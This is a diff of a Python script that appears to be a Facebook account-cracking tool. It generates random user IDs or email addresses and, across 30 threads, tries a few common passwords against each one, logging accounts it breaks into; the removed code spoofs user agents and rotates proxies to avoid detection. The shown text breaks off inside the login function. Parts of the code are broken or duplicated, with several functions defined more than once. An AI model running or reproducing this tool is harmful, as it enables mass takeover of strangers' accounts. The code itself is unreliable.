@@ -1,587 +1,481 @@
+W = '\033[97;1m' 
+R = '\033[91;1m' 
+G = '\033[92;1m' 
+Y = '\033[93;1m' 
+B = '\033[94;1m'
+P = '\033[95;1m'
+C = '\033[96;1m'
+N = '\x1b[0m'
 
 
-import os,sys,time,json,random,re,string,platform,base64,uuid
 
-from bs4 import BeautifulSoup as sop
-
-from bs4 import BeautifulSoup
-
-import requests as ress
-
-from datetime import date
-
-from datetime import datetime
-
-from time import sleep
-
-from os import system as s
-
-from time import sleep as waktu
+import os
+try:
+	import requests
+except ImportError:
+	os.system("pip install requests")
 
 try:
+	import concurrent.futures
+except ImportError:
+	os.system("pip install futures")
 
-    import requests
+import os
+import sys
+import time
+import requests
+import random
+import platform
+import base64
+import subprocess
+from concurrent.futures import ThreadPoolExecutor
 
-    from concurrent.futures import ThreadPoolExecutor as ThreadPool
 
-    import mechanize
+def runtxt(z):
+    for e in z + "\n":
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
 
-    from requests.exceptions import ConnectionError
 
-except ModuleNotFoundError:
 
-    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+def helpnote():
+	print("%s [*] FOLLOW ME ON Fb TU KNOW ABOUT UPDATES  :)"%(G))
+	subprocess.check_output(["am", "start", "plr = requests.get('https://github.com/TBBCYBERZONE/TBB_CONTROL_ROOM/blob/main/Aprov.txt"]).text
+	exit(" [*] FACEBOOK : MD TUSHAR SARKER ")
 
-    os.system('pip install bs4')
 
-    os.system('pkg install espeak')
-
-RED = '\033[1;91m'
-
-WHITE = '\033[1;97m'
-
-GREEN = '\033[1;32m' 
-
-YELLOW = '\033[1;33m'
-
-BLUE = '\033[1;34m'
-
-ORANGE = '\033[1;35m'
-
-P = '\x1b[1;97m' 
-
-M = '\x1b[1;91m' 
-
-H = '\x1b[1;92m' 
-
-K = '\x1b[1;93m' 
-
-B = '\x1b[1;94m' 
-
-U = '\x1b[1;95m' 
-
-O = '\x1b[1;96m' 
-
-N = '\x1b[0m'    
-
-A = '\x1b[1;90m' 
-
-BN = '\x1b[1;107m' 
-
-BBL = '\x1b[1;106m' 
-
-BP = '\x1b[1;105m' 
-
-BB = '\x1b[1;104m' 
-
-BK = '\x1b[1;103m' 
-
-BH = '\x1b[1;102m' 
-
-BM = '\x1b[1;101m' 
-
-BA = '\x1b[1;100m' 
-
-now = datetime.now()
-
-dt_string = now.strftime("%H:%M")
-
-current = datetime.now()
-
-ta = current.year
-
-bu = current.month
-
-ha = current.day
-
-today = date.today() 
-
-loop = 0
-
-oks = []
-
-cps = []
-
-ugen2=[]
-
-ugen=[]
-
-cokbrut=[]
-
-ses=requests.Session()
-
-princp=[]
-
-try:
-
- prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
-
- open('.prox.txt','w').write(prox)
-
-except Exception as e:
-
- print('')
-
-prox=open('.prox.txt','r').read().splitlines()
-
-for xd in range(10000):
-
-    aa='Mozilla/5.0 (Linux; U; Android 11;'
-
-    b=random.choice(['6','7','8','9','10','11','12'])
-
-    c='fr-fr; Redmi Note 11 Build/'
-
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-
-    e=random.randrange(1, 999)
-
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
-
-    h=random.randrange(73,100)
-
-    i='0'
-
-    j=random.randrange(4200,4900)
-
-    k=random.randrange(40,150)
-
-    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
-
-    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-
-    ugen.append(uaku2)
-
-#Mozilla/5.0 (Linux; U; Android 11; fr-fr; Redmi Note 11 Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn
-
-#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36
-
-    aa='Mozilla/5.0 (Linux; Android 13;'
-
-    b=random.choice(['7.0','8.1.0','9','10','11','12'])
-
-    c=random.choice(['Redmi Note 10 Pro'])
-
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-
-    e=random.randrange(1, 999)
-
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-
-    g='AppleWebKit/537.36 (KHTML, like Gecko)'
-
-    h=random.randrange(80,103)
-
-    i='0'
-
-    j=random.randrange(4200,4900)
-
-    k=random.randrange(40,150)
-
-    l='Chrome/107.0.0.0 Mobile Safari/537.36'
-
-    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-
-    ugen.append(uaku2)
-
-    
-
-    
-
-    aa='Mozilla/5.0 (Linux; Android 10;'
-
-    b=random.choice(['7.0','8.1.0','9','10','11','12'])
-
-    c=random.choice(['Redmi Note 10 Pro'])
-
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-
-    e=random.randrange(1, 999)
-
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-
-    g='AppleWebKit/537.36 (KHTML, like Gecko)'
-
-    h=random.randrange(80,103)
-
-    i='0'
-
-    j=random.randrange(4200,4900)
-
-    k=random.randrange(40,150)
-
-    l='Chrome/107.0.0.0 Mobile Safari/537.36'
-
-    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-
-    ugen.append(uaku2)
-
-	
-
-    aa='Mozilla/5.0 (Linux; Android 12;'
-
-    b=random.choice(['7.0','8.1.0','9','10','11','12'])
-
-    c=random.choice(['Redmi Note 10 Pro'])
-
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-
-    e=random.randrange(1, 999)
-
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-
-    g='AppleWebKit/537.36 (KHTML, like Gecko)'
-
-    h=random.randrange(80,103)
-
-    i='0'
-
-    j=random.randrange(4200,4900)
-
-    k=random.randrange(40,150)
-
-    l='Chrome/107.0.0.0 Mobile Safari/537.36'
-
-    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-
-    ugen.append(uaku2)
-
-	
-
-	
-
-    aa='Mozilla/5.0 (Linux; Android 11;'
-
-    b=random.choice(['7.0','8.1.0','9','10','11','12'])
-
-    c=random.choice(['Redmi Note 10 Pro'])
-
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-
-    e=random.randrange(1, 999)
-
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-
-    g='AppleWebKit/537.36 (KHTML, like Gecko)'
-
-    h=random.randrange(80,103)
-
-    i='0'
-
-    j=random.randrange(4200,4900)
-
-    k=random.randrange(40,150)
-
-    l='Chrome/107.0.0.0 Mobile Safari/537.36'
-
-    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-
-    ugen.append(uaku2)
-
-    
-
-    aa='Mozilla/5.0 (Linux; Android 9;'
-
-    b=random.choice(['7.0','8.1.0','9','10','11','12'])
-
-    c=random.choice(['Redmi Note 10 Pro'])
-
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-
-    e=random.randrange(1, 999)
-
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-
-    g='AppleWebKit/537.36 (KHTML, like Gecko)'
-
-    h=random.randrange(80,103)
-
-    i='0'
-
-    j=random.randrange(4200,4900)
-
-    k=random.randrange(40,150)
-
-    l='Chrome/107.0.0.0 Mobile Safari/537.36'
-
-    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-
-    ugen.append(uaku2)
-
-os.system('xdg-open https://github.com/TBBCYBERZONE ')
-
-
-
-logo = ("""
-
+def notice():
 
  
-████████╗██╗   ██╗███████╗██╗  ██╗ █████╗ ██████╗     
-╚══██╔══╝██║   ██║██╔════╝██║  ██║██╔══██╗██╔══██╗    
-   ██║   ██║   ██║███████╗███████║███████║██████╔╝    
-   ██║   ██║   ██║╚════██║██╔══██║██╔══██║██╔══██╗    
-   ██║   ╚██████╔╝███████║██║  ██║██║  ██║██║  ██║    
-   ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    
-                                                      
-                                                                                 
-                                                                                               
 
-\033[1;94m       [+]===============================================[+]
+	runtxt("\n\033[0;91mYOU ARE NOT PREMIUM USER ")
+	runtxt("\033[0;93m  SENT THIS KEY TO ADMIN >> %s%s"%(G,basesplit))
+	runtxt("\033[0;92m ADMIN MESSENGER🔰TUSHAR")
+	subprocess.check_output(["am", "start", "https://m.me/rafi.sarker.9085"])
 
-\033[1;94m       [+]        CREATED BY   :  TUSHAR               \033[1;94m[+]
-
-\033[1;94m       [+]        ON GITHUB    :  TBBCYBERZONE               \033[1;94m[+]
-
-\033[1;94m       [+]        TEAM         :  TBB CYBER ZONE        \033[1;94m[+]
-
-\033[1;94m       [+]        TOOL VERSION :  1.0.1                    \033[1;94m[+]
-
-\033[1;94m       [+]        TOOL STATUS  :  RANDOM CLONING         \033[1;94m[+]
-
-\033[1;94m       [+]        COUNTRY      :  BANGLADESH             \033[1;94m[+]
-
-\033[1;94m       [+]===============================================[+]
-
-""")                                              
-
+def irfan():
+	
+	
+	runtxt("\n\033[0;91m This tool is Under maintenance break ")
+	runtxt("\n\033[0;91m So wait For Update ")
+        
+	
+	
+plist = (platform.uname())[2]
+basex = plist
+basex1 = basex.encode('ascii')
+basex2 = base64.b64encode(basex1)
+basex3 = basex2.decode('ascii')
+base4 = (basex3).upper()
+basesplit = base4.replace('=', 'X').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', '8')
 
 
 class Main:
+	def __init__(self):
+		self.id = []
+		self.ok = []
+		self.cp = []
+		self.loop = 0
+		try:
+			plr = requests.get('https://github.com/TBBCYBERZONE/TBB_CONTROL_ROOM/blob/main/Aprov.txt').text
+			if basesplit in plr:
+				key = basesplit
+				stat = ("\033[0;92mPREMIUM")
+				FY = '\033[0;93m'
+				FG = '\033[0;92m'
+				GET = '\r'
+			else:
+				key = ("\033[0;91m -")
+				stat = ("\033[0;91mFREE USER")
+				FY = '\033[0;90m'
+				FG = '\033[0;90m'
+				GET = '\033[0;92m [P] GET PREMIUM'
+		except requests.exceptions.ConnectionError:
+			print("\n%s [!] NO INTERNET CONNECTION..\n"%(G))
+			exit()
+		os.system("clear")
+		
+		print ("""\033[1;92m   
+
+████████╗██╗   ██╗███████╗██╗  ██╗ █████╗ ██████╗ 
+╚══██╔══╝██║   ██║██╔════╝██║  ██║██╔══██╗██╔══██╗
+   ██║   ██║   ██║███████╗███████║███████║██████╔╝
+   ██║   ██║   ██║╚════██║██╔══██║██╔══██║██╔══██╗
+   ██║   ╚██████╔╝███████║██║  ██║██║  ██║██║  ██║
+   ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝                                                                                                                                  
+\033[1;90m══════════════════════════════════════════════════
+\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : Md Tushar Sarker 
+\033[1;91m [\033[1;94m✓\033[1;91m] \033]1;92mYOUTUBE : Hacking Bangla Tushar official 
+\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : TBBCYBERZONE 
+\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : 01863736449
+\033[1;90m══════════════════════════════════════════════════
+    """)
+		print("%s [%s•%s] %sTOOL NAME : %sSuper Speed Uid Cloning"%(G,R,G,B,G))
+		print("%s [%s•%s] %sVERSION   : %s2.0"%(G,R,G,B,G))
+		print("%s [%s•%s] %sYOUR KEY  : %s%s"%(G,R,G,B,G,key))
+		print("%s [%s•%s] %sSTATUS    : %s"%(G,R,G,B,stat)) 
+		print("")
+		print("%s [%s01%s]%s CRACK RANDOM FB ID 2009-11 %s(PRO) V1[High Speed]"%(R,G,R,Y,G))
+		print("%s [%s02%s]%s CRACK RANDOM FB ID 2005-8 %s (PRO) V2[High Speed]"%(R,G,R,Y,G))
+		print("%s [%s03%s]%s CRACK RANDOM FB ID 2004-5 %s (PRO) V3[Super Slow]"%(R,G,R,Y,G))
+		print("%s [%s04%s]%s CRACK FROM EMAILS %s(PRO) [Normal]"%(R,G,R,Y,G))
+		print(GET)
+		hoga = input("\n%s [?] CHOICE : "%(B))
+		if hoga in ["", " "]:
+			Main()
+		elif hoga in ["", "0"]:
+			if basesplit in plr:
+				self.oldcrack()
+			else: 
+				notice()
+				exit()
+		elif hoga in ["1", "01"]:
+			if basesplit in plr:
+			    self.fbtua()
+			else: 
+				notice()
+				exit()
+		elif hoga in ["2", "02"]:
+			if basesplit in plr:
+			    self.fbtua()
+			else: 
+				notice()
+				exit()
+		elif hoga in ["3", "03"]:
+			if basesplit in plr:
+				self.old4_5()
+			else: 
+				notice()
+				exit()
+		elif hoga in ["4", "04"]:
+			if basesplit in plr:
+				self.email()
+			else: 
+				notice()
+				exit()
+		elif hoga in ["P", "p"]:
+			notice()
+			exit()
+		else:
+			Main()
+
+	def oldcrack(self):
+		x = 11111111
+		xx = 99999999
+		idx = " 1000000"
+		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
+		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
+		if (limit)>50000:
+			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				self.id.append(__+str(_))
+			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
+				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
+				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
+				if len(listpass)<=5:
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
+				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
+				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
+				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
+				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
+				for user in self.id:
+					coeg.submit(self.api, user, listpass.split(","))
+			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
+		except Exception as e:exit(str(e))
+
+	def oldcrack(self):
+		x = 11111111
+		xx = 99999999
+		idx = " 1000000"
+		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
+		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
+		if (limit)>50000:
+			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				self.id.append(__+str(_))
+			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
+				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
+				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
+				if len(listpass)<=5:
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
+				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
+				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
+				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
+				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
+				for user in self.id:
+					coeg.submit(self.api, user, listpass.split(","))
+			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
+		except Exception as e:exit(str(e))
+
+	def fbtua(self):
+		x = 111111111
+		xx = 999999999
+		idx = "100000"
+		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
+		if (limit)>50000:
+			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				self.id.append(__+str(_))
+			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
+				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
+				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
+				if len(listpass)<=5:
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
+				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
+				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
+				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
+				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
+				for user in self.id:
+					coeg.submit(self.api, user, listpass.split(","))
+			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
+		except Exception as e:exit(str(e))
+
+	def oldcrack(self):
+		x = 11111111
+		xx = 99999999
+		idx = " 1000000"
+		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
+		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
+		if (limit)>50000:
+			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				self.id.append(__+str(_))
+			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
+				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
+				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
+				if len(listpass)<=5:
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
+				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
+				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
+				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
+				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
+				for user in self.id:
+					coeg.submit(self.api, user, listpass.split(","))
+			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
+		except Exception as e:exit(str(e))
+
+	def oldcrack(self):
+		x = 11111111
+		xx = 99999999
+		idx = " 1000000"
+		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
+		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
+		if (limit)>50000:
+			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				self.id.append(__+str(_))
+			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
+				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
+				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
+				if len(listpass)<=5:
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
+				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
+				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
+				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
+				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
+				for user in self.id:
+					coeg.submit(self.api, user, listpass.split(","))
+			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
+		except Exception as e:exit(str(e))
+
+
+	def old4_6(self):
+		x = 1111111
+		xx = 9999999
+		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
+		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
+		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))
+		if (limit)>10000:
+			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				self.id.append(__+str(_))
+			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
+				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 
+				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
+				if len(listpass)<=5:
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
+				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
+				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
+				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
+				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
+				for user in self.id:
+					coeg.submit(self.api, user, listpass.split(","))
+			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
+		except Exception as e:exit(str(e))
+		
+		
+	def old4_5(self):
+		x = 111111
+		xx = 999999
+		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
+		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
+		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
+		if (limit)>50000:
+			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				self.id.append(__+str(_))
+			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
+				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 
+				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
+				if len(listpass)<=5:
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
+				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
+				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
+				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
+				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
+				for user in self.id:
+					coeg.submit(self.api, user, listpass.split(","))
+			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
+		except Exception as e:exit(str(e))
+		
+		
+	def old4_5(self):
+		x = 111111
+		xx = 999999
+		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
+		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
+		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))
+		if (limit)>10000:
+			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				self.id.append(__+str(_))
+			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
+				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 
+				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
+				if len(listpass)<=5:
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
+				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
+				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
+				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
+				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
+				for user in self.id:
+					coeg.submit(self.api, user, listpass.split(","))
+			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
+		except Exception as e:exit(str(e))
+
+
+	def email(self):
+		x = 111
+		xx = 999
+		nam = input("%s [?] TYPE A NAME %s(EX: Tushar): "%(Y,G))
+		nam = nam.replace(" ", "")
+		print("%s EXAMPLE  : %s@gmail.com, @yahoo.com, @hotmail.com ETC"%(Y,G))
+		idx = input("%s DOMAIN  : "%(B))
+		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
+		if (limit)>50000:
+			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				___ = nam
+				self.id.append(___+str(_)+__)
+			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
+				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 
+				listpass = input(" [?] ENTER PASSWORD : ")
+				if len(listpass)<=5:
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
+				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
+				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
+				print("%s [+] CP RESULT SAVED IN -> cp.txt"%(Y))
+				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
+				for user in self.id:
+					coeg.submit(self.api, user, listpass.split(","))
+			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
+		except Exception as e:exit(str(e))
+		
+		
+
+	def api(self, uid, pwx):
+		ua = random.choice([
